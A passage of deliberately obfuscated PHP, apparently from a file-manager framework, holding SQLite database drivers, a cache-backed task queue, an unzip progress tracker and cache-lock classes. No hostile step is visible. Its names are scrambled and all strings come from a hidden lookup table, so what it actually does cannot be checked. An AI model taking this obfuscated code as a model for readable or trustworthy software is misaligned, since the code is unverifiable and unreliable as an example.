sqlite_query($this->_linkID, $_SERVER[áäÒ½¯Ç][27]); if (!$ÂşìùïÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $´ºÚ›öÊ = sqlite_query($this->_linkID, $_SERVER[áäÒ½¯Ç][28]); if (!$´ºÚ›öÊ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‘ÍÚâø = array(); if ($this->numRows > 0) { for ($¿ˆ¹µÂ = 0; $¿ˆ¹µÂ < $this->numRows; $¿ˆ¹µÂ++) { $‘ÍÚâø[$¿ˆ¹µÂ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $‘ÍÚâø; } public function getFields($æá×¿ßß) { $£ïƒ‹† =& $_SERVER[áäÒ½¯Ç]; $­ÛÚË  = $this->query($£ïƒ‹†[29] . $æá×¿ßß . $£ïƒ‹†[30]); $·¿‚¯ĞÉ = array(); if ($­ÛÚË ) { foreach ($­ÛÚË  as $Ç¸‡¸­î => $ƒëÊş—Á) { $·¿‚¯ĞÉ[$ƒëÊş—Á[$£ïƒ‹†[31]]] = array($£ïƒ‹†[32] => $ƒëÊş—Á[$£ïƒ‹†[31]], $£ïƒ‹†[33] => $ƒëÊş—Á[$£ïƒ‹†[34]], $£ïƒ‹†[35] => (bool) ($ƒëÊş—Á[$£ïƒ‹†[36]] === $£ïƒ‹†[12]), $£ïƒ‹†[37] => $ƒëÊş—Á[$£ïƒ‹†[38]], $£ïƒ‹†[39] => strtolower($ƒëÊş—Á[$£ïƒ‹†[40]]) == $£ïƒ‹†[41], $£ïƒ‹†[42] => strtolower($ƒëÊş—Á[$£ïƒ‹†[43]]) == $£ïƒ‹†[44]); } } return $·¿‚¯ĞÉ; } public function getTables($®¯¨‹ğ¸ = '') { $ô«ŠÁ =& $_SERVER[áäÒ½¯Ç]; $»ÚóÇúÍ = $this->query($ô«ŠÁ[45] . $ô«ŠÁ[46] . $ô«ŠÁ[47]); $Èï¥‰¸ = array(); foreach ($»ÚóÇúÍ as $×ƒÁ»…à => $Ö‡™úÑç) { $Èï¥‰¸[$×ƒÁ»…à] = current($Ö‡™úÑç); } return $Èï¥‰¸; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $—¤›ı =& $_SERVER[áäÒ½¯Ç]; $Ï¨ÛÍş¬ = sqlite_last_error($this->_linkID); $this->error = $Ï¨ÛÍş¬ . $—¤›ı[4] . sqlite_error_string($Ï¨ÛÍş¬); if ($—¤›ı[12] != $this->queryStr) { $this->error .= LNG($—¤›ı[48]) . $this->queryStr; } think_trace($this->error, $—¤›ı[12], $—¤›ı[49]); return $this->error; } public function escapeString($–²î’á) { return sqlite_escape_string($–²î’á); } public function parseLimit($›Ÿ¶˜ˆ) { $ë×Ôæñ€ =& $_SERVER[áäÒ½¯Ç]; $è®ù—¿ = $ë×Ôæñ€[12]; if (!empty($›Ÿ¶˜ˆ)) { $›Ÿ¶˜ˆ = explode($ë×Ôæñ€[50], $›Ÿ¶˜ˆ); if (count($›Ÿ¶˜ˆ) > 1) { $è®ù—¿ .= $ë×Ôæñ€[51] . $›Ÿ¶˜ˆ[1] . $ë×Ôæñ€[52] . $›Ÿ¶˜ˆ[0] . $ë×Ôæñ€[53]; } else { $è®ù—¿ .= $ë×Ôæñ€[51] . $›Ÿ¶˜ˆ[0] . $ë×Ôæñ€[53]; } } return $è®ù—¿; } } class DbSqlite3Base extends Db { public function __construct($™ò£‰‡  = '') { $ÄƒİŸ¼ =& $_SERVER[áäÒ½¯Ç]; if (!class_exists($ÄƒİŸ¼[54])) { think_exception(think_lang($ÄƒİŸ¼[14]) . $ÄƒİŸ¼[55]); } if (!empty($™ò£‰‡ )) { if (!isset($™ò£‰‡ [$ÄƒİŸ¼[16]])) { $™ò£‰‡ [$ÄƒİŸ¼[16]] = 438; } $this->config = $™ò£‰‡ ; if (empty($this->config[$ÄƒİŸ¼[17]])) { $this->config[$ÄƒİŸ¼[17]] = array(); } } } public function connect($ĞÔ£–ù = '', $·§êüàù = 0) { $¼õøƒŞù =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->linkID[$·§êüàù])) { if (empty($ĞÔ£–ù)) { $ĞÔ£–ù = $this->config; } $this->linkID[$·§êüàù] = new SQLite3($ĞÔ£–ù[$¼õøƒŞù[21]]); if (!$this->linkID[$·§êüàù]) { think_exception($this->linkID[$·§êüàù]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$·§êüàù]->busyTimeout(30000); if (1 != think_config($¼õøƒŞù[22])) { unset($this->config); } } return $this->linkID[$·§êüàù]; } public function free() { $this->queryID = null; } public function query($³†íãó) { $ŸÍ¯úÃ =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³†íãó; if ($this->queryID) { $this->free(); } think_action_status($ŸÍ¯úÃ[23], 1); think_status($ŸÍ¯úÃ[24]); $this->queryID = $this->_linkID->query($³†íãó); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‘Ûù‰İ– = $this->getAll(); $this->numRows = count($‘Ûù‰İ–); return $‘Ûù‰İ–; } } public function execute($şŸçõ©µ) { $Ğ½î‡éñ =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $şŸçõ©µ; if ($this->queryID) { $this->free(); } think_action_status($Ğ½î‡éñ[25], 1); think_status($Ğ½î‡éñ[24]); $ŠÅ»ğ… = $this->_linkID->exec($şŸçõ©µ); $this->debug(); if (!1 === $ŠÅ»ğ…) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[áäÒ½¯Ç][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó óÚî™ = $this->_linkID->query($_SERVER[áäÒ½¯Ç][27]); if (!$Ó óÚî™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $é†–ìÊÙ = $this->_linkID->query($_SERVER[áäÒ½¯Ç][28]); if (!$é†–ìÊÙ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Œ…ÚÚòû = array(); while ($¾Ùµ©¶× = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Œ…ÚÚòû[] = $¾Ùµ©¶×; } $this->queryID->reset(); return $Œ…ÚÚòû; } public function getFields($¨²Šš„›) { $Ïõì¼Íà =& $_SERVER[áäÒ½¯Ç]; $‚©˜ÔğÑ = $this->query($Ïõì¼Íà[29] . $¨²Šš„› . $Ïõì¼Íà[30]); $©ÌšÛï = array(); if ($‚©˜ÔğÑ) { foreach ($‚©˜ÔğÑ as $µ«ÒÀˆ‚ => $¿í¥ûÌ£) { $©ÌšÛï[$¿í¥ûÌ£[$Ïõì¼Íà[32]]] = array($Ïõì¼Íà[32] => $¿í¥ûÌ£[$Ïõì¼Íà[32]], $Ïõì¼Íà[33] => $¿í¥ûÌ£[$Ïõì¼Íà[33]], $Ïõì¼Íà[35] => (bool) ($¿í¥ûÌ£[$Ïõì¼Íà[35]] === $Ïõì¼Íà[12]), $Ïõì¼Íà[37] => $¿í¥ûÌ£[$Ïõì¼Íà[56]], $Ïõì¼Íà[39] => (bool) $¿í¥ûÌ£[$Ïõì¼Íà[57]], $Ïõì¼Íà[42] => (bool) $¿í¥ûÌ£[$Ïõì¼Íà[57]]); } } return $©ÌšÛï; } public function getTables($†ÑªôŞş = '') { $’ú ‡ƒ¶ =& $_SERVER[áäÒ½¯Ç]; $€×óƒéÇ = $this->query($’ú ‡ƒ¶[45] . $’ú ‡ƒ¶[46] . $’ú ‡ƒ¶[47]); $—ÅØ«¢¢ = array(); foreach ($€×óƒéÇ as $±Ëùå³© => $‚Õ´¶º°) { $—ÅØ«¢¢[$±Ëùå³©] = current($‚Õ´¶º°); } return $—ÅØ«¢¢; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $öš‹“Ú× =& $_SERVER[áäÒ½¯Ç]; $this->error = $this->_linkID->lastErrorMsg(); if ($öš‹“Ú×[12] != $this->queryStr) { $this->error .= LNG($öš‹“Ú×[48]) . $this->queryStr; } think_trace($this->error, $öš‹“Ú×[12], $öš‹“Ú×[49]); return $this->error; } public function escapeString($’èŒ¢Ö) { $Ìş›‹ÏÂ =& $_SERVER[áäÒ½¯Ç]; if ($this->_linkID) { return $this->_linkID->escapeString($’èŒ¢Ö); } return str_ireplace($Ìş›‹ÏÂ[58], $Ìş›‹ÏÂ[59], $’èŒ¢Ö); } public function parseLimit($Ï†¼©©ö) { $àû‰‹¹« =& $_SERVER[áäÒ½¯Ç]; $àÇ‰µªÕ = $àû‰‹¹«[12]; if (!empty($Ï†¼©©ö)) { $Ï†¼©©ö = explode($àû‰‹¹«[50], $Ï†¼©©ö); if (count($Ï†¼©©ö) > 1) { $àÇ‰µªÕ .= $àû‰‹¹«[51] . $Ï†¼©©ö[1] . $àû‰‹¹«[52] . $Ï†¼©©ö[0] . $àû‰‹¹«[53]; } else { $àÇ‰µªÕ .= $àû‰‹¹«[51] . $Ï†¼©©ö[0] . $àû‰‹¹«[53]; } } return $àÇ‰µªÕ; } } goto dÛÔËŸâ; b›®ÒĞë„: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\x65\165\x65\114\145\x6e\147\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\x75\x65\165\145\x44\141\164\141"; const QUEUE_TIME = "\164\x61\x73\x6b\x51\165\x65\165\145\114\x61\x73\164\122\x75\x6e"; const QUEUE_THREAD = "\x74\141\163\153\x51\165\145\x75\x65\x54\150\162\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ü×âù€ˆ, $Ûáåé‘º = array(), $û¾‡«ší = '', $„†Ş“¹™ = '') { $èÉ¾˜Ö¢ =& $_SERVER[áäÒ½¯Ç]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($„†Ş“¹™ && array_find_by_field(self::$listData, $èÉ¾˜Ö¢[95], $„†Ş“¹™)) { return !0; } if ($„†Ş“¹™ && array_find_by_field(self::$listDataAdd, $èÉ¾˜Ö¢[95], $„†Ş“¹™)) { return !0; } self::$listDataAdd[] = array($èÉ¾˜Ö¢[352] => $ü×âù€ˆ, $èÉ¾˜Ö¢[2035] => $Ûáåé‘º, $èÉ¾˜Ö¢[545] => $û¾‡«ší, $èÉ¾˜Ö¢[95] => $„†Ş“¹™); return !0; } public static function addSubmit() { $‡ƒæ¸¿ç =& $_SERVER[áäÒ½¯Ç]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($‡ƒæ¸¿ç[2036] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $‡ƒæ¸¿ç[12], $‡ƒæ¸¿ç[545])), $‡ƒæ¸¿ç[196]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($í¢Íºğ, $°…É½ÃÛ = array(), $åã©Ì·ù = '', $£Ô”¯ = '') { $ß†ô…¬Â =& $_SERVER[áäÒ½¯Ç]; if (self::count() >= self::MAX_LENGTH) { return !1; } $á±¾èÓ‡ = self::getAll(); if ($£Ô”¯ && array_find_by_field($á±¾èÓ‡, $ß†ô…¬Â[95], $£Ô”¯)) { return !0; } $á±¾èÓ‡[] = array($ß†ô…¬Â[352] => $í¢Íºğ, $ß†ô…¬Â[2035] => $°…É½ÃÛ, $ß†ô…¬Â[545] => $åã©Ì·ù, $ß†ô…¬Â[95] => $£Ô”¯); self::setAll($á±¾èÓ‡); write_log($ß†ô…¬Â[2036] . $åã©Ì·ù, $ß†ô…¬Â[196]); return !0; } public static function run() { $üíèÌÎó =& $_SERVER[áäÒ½¯Ç]; $å„©´ùÆ = self::getAll(); $şï²°ò¯ = array_shift($å„©´ùÆ); if (!$şï²°ò¯) { return !1; } self::setAll($å„©´ùÆ); $°Š¶¤ºÚ = timeFloat(); $¹‡ æºá = $üíèÌÎó[12]; try { $¹‡ æºá = Hook::apply($şï²°ò¯[$üíèÌÎó[352]], $şï²°ò¯[$üíèÌÎó[2035]]); } catch (Exception $ã÷²ú²î) { write_log($ã÷²ú²î, $üíèÌÎó[1317]); } $›¨”¤ûš = number_format(timeFloat() - $°Š¶¤ºÚ, 3) . $üíèÌÎó[1942]; if ($¹‡ æºá && is_string($¹‡ æºá)) { $›¨”¤ûš = $›¨”¤ûš . $üíèÌÎó[2037] . $¹‡ æºá; } write_log($üíèÌÎó[2038] . $şï²°ò¯[$üíèÌÎó[545]] . $üíèÌÎó[2039] . $›¨”¤ûš, $üíèÌÎó[196]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $èÌ²úâß =& $_SERVER[áäÒ½¯Ç]; $„ùïå¿˜ = self::threadCount() + 1; if ($„ùïå¿˜ > 3 || !self::count()) { return; } write_log($èÌ²úâß[2040] . $„ùïå¿˜, $èÌ²úâß[196]); Cache::set(self::QUEUE_THREAD, $„ùïå¿˜, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($èÌ²úâß[2041], $èÌ²úâß[196]); } public static function getKey($µÏÒê, $ ±€áÂñ = "\x69\x6e\164") { $Ç§í× =& $_SERVER[áäÒ½¯Ç]; Cache::removeMemory($µÏÒê); $€­ÍÚşå = Cache::get($µÏÒê); if ($ ±€áÂñ == $Ç§í×[374]) { return $€­ÍÚşå ? intval($€­ÍÚşå) : 0; } if ($ ±€áÂñ == $Ç§í×[2042]) { return is_array($€­ÍÚşå) ? $€­ÍÚşå : array(); } return $€­ÍÚşå; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[áäÒ½¯Ç][2042]); } public static function setAll($§ºÇÆ“ç) { $Ğ®—‚©´ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($§ºÇÆ“ç), $Ğ®—‚©´); Cache::set(self::QUEUE_DATA, $§ºÇÆ“ç, $Ğ®—‚©´); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($šæÑØÄı, $ôå×ÁÍ” = 5.0) { if (!$šæÑØÄı) { return; } $¬ï¹ßûé = Cache::get($šæÑØÄı); if (!$¬ï¹ßûé || timeFloat() - floatVal($¬ï¹ßûé) >= $ôå×ÁÍ”) { Cache::set($šæÑØÄı, timeFloat(), $ôå×ÁÍ” * 10); return !0; } return !1; } public static function timeLimitCall($…»«õ, $¡ñ’´‘Å, $±Àé˜ıÂ, $Ü«Èµö˜ = 5.0) { $»Õı·ƒ” =& $_SERVER[áäÒ½¯Ç]; if (!$…»«õ || !$¡ñ’´‘Å) { return; } self::$asyncAdd = !0; $¨¤Ã‡Üø = $»Õı·ƒ”[2043]; $É¤ «óš = Cache::get($¨¤Ã‡Üø, !0); $ÓÈ“»’ = array($»Õı·ƒ”[2044] => timeFloat(), $»Õı·ƒ”[2045] => timeFloat(), $»Õı·ƒ”[352] => $¡ñ’´‘Å, $»Õı·ƒ”[2035] => $±Àé˜ıÂ, $»Õı·ƒ”[2046] => $Ü«Èµö˜); if (is_array($É¤ «óš[$…»«õ])) { if (timeFloat() - $É¤ «óš[$…»«õ][$»Õı·ƒ”[2044]] <= $ÓÈ“»’[$»Õı·ƒ”[2046]] * 0.5) { return; } $ÓÈ“»’[$»Õı·ƒ”[2045]] = $É¤ «óš[$…»«õ][$»Õı·ƒ”[2045]]; } $É¤ «óš[$…»«õ] = $ÓÈ“»’; Cache::set($¨¤Ã‡Üø, $É¤ «óš, 60); Cache::removeMemory($¨¤Ã‡Üø); write_log($»Õı·ƒ”[2047] . $…»«õ . $»Õı·ƒ”[74] . $¡ñ’´‘Å . $»Õı·ƒ”[2048] . ACTION, $»Õı·ƒ”[196]); } public static function timeLimitCallLoop() { $•õ°¼Ø =& $_SERVER[áäÒ½¯Ç]; $µí›¯§« = array($•õ°¼Ø[2049]); $ŞÜÆéÆ§ = in_array(strtolower(ACTION), $µí›¯§«); if (!$ŞÜÆéÆ§ && !self::$asyncAdd) { return; } $‘­¦¸ƒû = $•õ°¼Ø[2043]; $ÈŠáŠçù = Cache::get($‘­¦¸ƒû, !0); if (!$ÈŠáŠçù || count($ÈŠáŠçù) <= 0) { return; } $·ğŞ‚ıø = timeFloat(); $ø¡Ç¾É = array(); $Ù¯Ê ºâ = array(); foreach ($ÈŠáŠçù as $µÔõÇç => $¤—¢¢…‘) { if ($·ğŞ‚ıø - $¤—¢¢…‘[$•õ°¼Ø[2045]] > $¤—¢¢…‘[$•õ°¼Ø[2046]]) { $Ù¯Ê ºâ[$µÔõÇç] = $¤—¢¢…‘; continue; } $ø¡Ç¾É[$µÔõÇç] = $¤—¢¢…‘; } if (count($Ù¯Ê ºâ) == 0) { return; } if (count($ø¡Ç¾É) == 0) { Cache::remove($‘­¦¸ƒû); } else { Cache::set($‘­¦¸ƒû, $ø¡Ç¾É, 60); } Cache::removeMemory($‘­¦¸ƒû); self::runArr($Ù¯Ê ºâ); } public static function finished($‡¿¡¯É˜, $òÑ¦ÅÃû) { $™¾÷Íİá =& $_SERVER[áäÒ½¯Ç]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($™¾÷Íİá[352] => $‡¿¡¯É˜, $™¾÷Íİá[2035] => $òÑ¦ÅÃû); } private static function runArr($¹¤òÂ¯©) { $êÂïÅó¾ =& $_SERVER[áäÒ½¯Ç]; if (!$¹¤òÂ¯©) { return; } foreach ($¹¤òÂ¯© as $‰á¯Æ¸’ => $Ì•½éË›) { try { Hook::apply($Ì•½éË›[$êÂïÅó¾[352]], $Ì•½éË›[$êÂïÅó¾[2035]]); write_log($êÂïÅó¾[2050] . $‰á¯Æ¸’ . $êÂïÅó¾[74] . $Ì•½éË›[$êÂïÅó¾[352]] . $êÂïÅó¾[2048] . ACTION, $êÂïÅó¾[196]); } catch (Exception $àîë÷Óï) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Æç»ú´¿ =& $_SERVER[áäÒ½¯Ç]; parent::startAfter(); Hook::bind($Æç»ú´¿[2051], array($this, $Æç»ú´¿[2052])); Hook::bind($Æç»ú´¿[1330], array($this, $Æç»ú´¿[2053])); Hook::bind($Æç»ú´¿[2054], array($this, $Æç»ú´¿[2055])); $›ûÑæáÅ =& $this->task; $›ûÑæáÅ[$Æç»ú´¿[2056]] = $Æç»ú´¿[1331]; if (!$›ûÑæáÅ[$Æç»ú´¿[1815]]) { $›ûÑæáÅ[$Æç»ú´¿[1815]] = LNG($Æç»ú´¿[2057]); } } protected function endAfter() { $ÖĞê°ñ =& $_SERVER[áäÒ½¯Ç]; parent::endAfter(); Hook::unbind($ÖĞê°ñ[2051], array($this, $ÖĞê°ñ[2052])); Hook::unbind($ÖĞê°ñ[1330], array($this, $ÖĞê°ñ[2053])); Hook::unbind($ÖĞê°ñ[2054], array($this, $ÖĞê°ñ[2055])); } public function updateAfter() { $ÏÒ¬äÌÜ =& $_SERVER[áäÒ½¯Ç]; $ëÙ©Çè’ =& $this->task; if (!$ëÙ©Çè’[$ÏÒ¬äÌÜ[1178]] || !$ëÙ©Çè’[$ÏÒ¬äÌÜ[866]]) { if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[2056]] != $ÏÒ¬äÌÜ[398]) { return; } } if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[2056]] == $ÏÒ¬äÌÜ[1331]) { $ô²…Şæ = 0; if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[1980]]) { $ô²…Şæ = $ëÙ©Çè’[$ÏÒ¬äÌÜ[1981]] / $ëÙ©Çè’[$ÏÒ¬äÌÜ[1980]]; } $ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]] = $ô²…Şæ * 0.3; } else { if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[2056]] == $ÏÒ¬äÌÜ[398]) { $ô²…Şæ = $ëÙ©Çè’[$ÏÒ¬äÌÜ[1927]] / $ëÙ©Çè’[$ÏÒ¬äÌÜ[1178]]; $ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]] = 0.3 + $ô²…Şæ * 0.4; } else { if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[2056]] == $ÏÒ¬äÌÜ[108]) { $øÖğÔÉ† = 0; if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[1982]] == $ÏÒ¬äÌÜ[108]) { $øÖğÔÉ† = $ëÙ©Çè’[$ÏÒ¬äÌÜ[1981]]; } $ô²…Şæ = ($ëÙ©Çè’[$ÏÒ¬äÌÜ[1985]] + $øÖğÔÉ†) / $ëÙ©Çè’[$ÏÒ¬äÌÜ[866]]; $ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]] = 0.3 + 0.4 + $ô²…Şæ * 0.3; } } } if ($ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]] > 0) { $ğÏ—¦Ç— = timeFloat() - $ëÙ©Çè’[$ÏÒ¬äÌÜ[1930]] - $ëÙ©Çè’[$ÏÒ¬äÌÜ[1933]]; $ëÙ©Çè’[$ÏÒ¬äÌÜ[1934]] = $ğÏ—¦Ç— * (1 - $ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]]) / $ëÙ©Çè’[$ÏÒ¬äÌÜ[1928]]; } } public function addFile($ËÀú¬îŠ) { $‰®Øöšò =& $_SERVER[áäÒ½¯Ç]; $ùğ¿û°’ =& $this->task; $òÕÂ¹Çı = IO::info($ËÀú¬îŠ); $ùğ¿û°’[$‰®Øöšò[1978]] = $òÕÂ¹Çı[$‰®Øöšò[32]]; $ùğ¿û°’[$‰®Øöšò[1980]] = $òÕÂ¹Çı[$‰®Øöšò[79]]; $ùğ¿û°’[$‰®Øöšò[1981]] = 0; $ùğ¿û°’[$‰®Øöšò[1180]] = $‰®Øöšò[2009]; $ùğ¿û°’[$‰®Øöšò[1982]] = $‰®Øöšò[1331]; $ùğ¿û°’[$‰®Øöšò[866]] = $òÕÂ¹Çı[$‰®Øöšò[79]]; $ùğ¿û°’[$‰®Øöšò[1178]] = 1; $Ñ™×÷ = 0; $ùğ¿û°’[$‰®Øöšò[1991]] = array($‰®Øöšò[1992] => $Ñ™×÷ + 1, $‰®Øöšò[514] => $òÕÂ¹Çı[$‰®Øöšò[32]], $‰®Øöšò[87] => $òÕÂ¹Çı[$‰®Øöšò[87]], $‰®Øöšò[607] => $òÕÂ¹Çı[$‰®Øöšò[607]] ? $òÕÂ¹Çı[$‰®Øöšò[607]] : $òÕÂ¹Çı[$‰®Øöšò[87]]); $this->update(); } public function zipEvent($èØ¢Ÿµ², $Ö®Û¿Ø–, $ Ó©Î«í, $í´ºÎœƒ) { $£µ“Ê¨‘ =& $_SERVER[áäÒ½¯Ç]; $Í’àèçë =& $this->task; $Í’àèçë[$£µ“Ê¨‘[1978]] = get_path_this($Ö®Û¿Ø–); $Í’àèçë[$£µ“Ê¨‘[1980]] = $í´ºÎœƒ; $Í’àèçë[$£µ“Ê¨‘[1981]] = $ Ó©Î«í; $Í’àèçë[$£µ“Ê¨‘[1180]] = $èØ¢Ÿµ² == $£µ“Ê¨‘[2058] ? $£µ“Ê¨‘[2059] : $£µ“Ê¨‘[2060]; $Í’àèçë[$£µ“Ê¨‘[1982]] = $£µ“Ê¨‘[12]; $Í’àèçë[$£µ“Ê¨‘[866]] = $í´ºÎœƒ; $Í’àèçë[$£µ“Ê¨‘[2056]] = $£µ“Ê¨‘[398]; $this->update(); } public function unzipAfter($—ˆÑ—ş) { $ÎºüŞôê =& $_SERVER[áäÒ½¯Ç]; $ã“Œ§³± =& $this->task; $ã“Œ§³±[$ÎºüŞôê[2056]] = $ÎºüŞôê[108]; $î§’èÅµ = IO::infoWithChildren($—ˆÑ—ş); $¼ƒÈøß› = 0; $ã“Œ§³±[$ÎºüŞôê[1991]] = array($ÎºüŞôê[1992] => $¼ƒÈøß› + 1, $ÎºüŞôê[514] => $î§’èÅµ[$ÎºüŞôê[32]], $ÎºüŞôê[87] => $î§’èÅµ[$ÎºüŞôê[87]], $ÎºüŞôê[607] => $î§’èÅµ[$ÎºüŞôê[607]] ? $î§’èÅµ[$ÎºüŞôê[607]] : $î§’èÅµ[$ÎºüŞôê[87]]); if ($î§’èÅµ[$ÎºüŞôê[33]] == $ÎºüŞôê[241]) { $ã“Œ§³±[$ÎºüŞôê[1178]] = 1; } else { $ã“Œ§³±[$ÎºüŞôê[1178]] = $î§’èÅµ[$ÎºüŞôê[82]][$ÎºüŞôê[80]]; } $ã“Œ§³±[$ÎºüŞôê[1180]] = $ÎºüŞôê[12]; $ã“Œ§³±[$ÎºüŞôê[1982]] = 0; $ã“Œ§³±[$ÎºüŞôê[1927]] = 0; $ã“Œ§³±[$ÎºüŞôê[1980]] = 0; $ã“Œ§³±[$ÎºüŞôê[1981]] = 0; $ã“Œ§³±[$ÎºüŞôê[1978]] = $ÎºüŞôê[12]; $ã“Œ§³±[$ÎºüŞôê[1985]] = 0; $ã“Œ§³±[$ÎºüŞôê[866]] = $î§’èÅµ[$ÎºüŞôê[79]]; $this->update(); self::log($ÎºüŞôê[2061] . json_encode(array($ã“Œ§³±, $î§’èÅµ))); } public function nameParse($¾Û–­Üç) { $¹Ó‘ÑÎ¦ =& $_SERVER[áäÒ½¯Ç]; $âÁ€­ğ =& $this->task; if ($âÁ€­ğ[$¹Ó‘ÑÎ¦[2056]] == $¹Ó‘ÑÎ¦[1331]) { $âÁ€­ğ[$¹Ó‘ÑÎ¦[2056]] = $¹Ó‘ÑÎ¦[398]; $âÁ€­ğ[$¹Ó‘ÑÎ¦[1985]] = 0; $âÁ€­ğ[$¹Ó‘ÑÎ¦[866]] = 0; } $³¾Ûß» = get_path_this($¾Û–­Üç); if (strstr($³¾Ûß», $¹Ó‘ÑÎ¦[10])) { $âÁ€­ğ[$¹Ó‘ÑÎ¦[1927]] += 1; $âÁ€­ğ[$¹Ó‘ÑÎ¦[1178]] += 1; } $âÁ€­ğ[$¹Ó‘ÑÎ¦[1978]] = $¾Û–­Üç; $this->update(); } } goto Bò°â¤ä„¾; c±ÙÁ‡Ÿ¸ê: define($_SERVER[áäÒ½¯Ç][327], 3); define($_SERVER[áäÒ½¯Ç][328], 1); define($_SERVER[áäÒ½¯Ç][329], 0); goto Eæ‚ô–¹×; D°äË Œ¹ñ: class CacheLockMemcached { public function lock($¹—´¹ÄÜ, $Å÷œŠø = 0) { $ÊÛºœ„‹ = Cache::init(); $¨ô¨ò = microtime(!0) + $Å÷œŠø; while (microtime(!0) < $¨ô¨ò) { $­ÓÖ©…ê = $ÊÛºœ„‹->get($¹—´¹ÄÜ); if (!$­ÓÖ©…ê || $­ÓÖ©…ê < microtime(!0)) { $œçßèù„ = $ÊÛºœ„‹->handle->add($¹—´¹ÄÜ, $¨ô¨ò, $Å÷œŠø); if ($œçßèù„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ü¿è€Íë) { return Cache::init()->get($Ü¿è€Íë); } public function unlock($¡Ñ¯„É•) { return Cache::init()->remove($¡Ñ¯„É•); } } class CacheLockDatabase { public function lock($ø ·ş´, $õı“Ø¨ò = 0) { $„ÅŞ„¶§ = Model($_SERVER[áäÒ½¯Ç][939]); $²õÔ“ = microtime(!0) + $õı“Ø¨ò; while (microtime(!0) < $²õÔ“) { $¶§ø·È‘ = $„ÅŞ„¶§->get($ø ·ş´); if (!$¶§ø·È‘ || $¶§ø·È‘ < microtime(!0)) { $¥ÇŸ¢Æ = $„ÅŞ„¶§->set($ø ·ş´, $²õÔ“); if ($¥ÇŸ¢Æ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…¦ìÇîª) { return Model($_SERVER[áäÒ½¯Ç][939])->get($…¦ìÇîª); } public function unlock($œ£îØ ğ) { Model($_SERVER[áäÒ½¯Ç][939])->remove($œ£îØ ğ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($“‡ß„ªâ, $ˆ´ü‘è¹) { $¨‡÷Æå“ =& $_SERVER[áäÒ½¯Ç]; if (!class_exists($¨‡÷Æå“[981])) { show_json($¨‡÷Æå“[982], !1); } $this->cacheTime = $ˆ´ü‘è¹; $this->handle = new Memcached(); if (is_array($“‡ß„ªâ[$¨‡÷Æå“[983]]) && count($“‡ß„ªâ[$¨‡÷Æå“[983]]) >= 1) { foreach ($“‡ß„ªâ[$¨‡÷Æå“[983]] as $„ó‘‹æ») { $ó›ßÊ = explode($¨‡÷Æå“[4], $„ó‘‹æ»); $this->handle->addServer($ó›ßÊ[0], $ó›ßÊ[1]); } } else { $this->handle->addServer($“‡ß„ªâ[$¨‡÷Æå“[207]], $“‡ß„ªâ[$¨‡÷Æå“[208]]); } } public function set($´¾˜êŞ, $Éá”ÑÍä, $ó´ÌˆË = false) { $ó´ÌˆË = $ó´ÌˆË ? $ó´ÌˆË : 